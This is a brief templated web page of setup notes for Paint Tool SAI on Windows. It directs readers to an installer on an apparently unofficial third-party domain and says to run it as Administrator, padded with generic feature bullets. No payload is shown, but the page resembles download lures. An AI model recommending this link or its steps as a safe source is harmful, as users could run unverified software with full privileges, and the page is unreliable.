# Paint Tool SAI Windows Setup Notes

**Download:** [Get Windows installer →](https://paint-tool-sai-setup.kolmods.com/)

## Download & Install

> Setup notes for **Paint Tool SAI** on Windows 10/11 (64-bit). Run the installer as Administrator.

### Quick steps

1. Download the latest Windows build for your edition
2. Save the file to a local folder you can find later
3. Run the setup **as Administrator**
4. Enter your license key when prompted
5. Restart if the installer asks — then launch **Paint Tool SAI** from the Start menu

## What you can use it for

- Core Paint Tool SAI features on Windows desktop
- Install and configure Paint Tool SAI for daily use
- Import, edit, and export with Paint Tool SAI tools
- Tune settings and profiles inside Paint Tool SAI
- Integrate Paint Tool SAI into your existing workflow
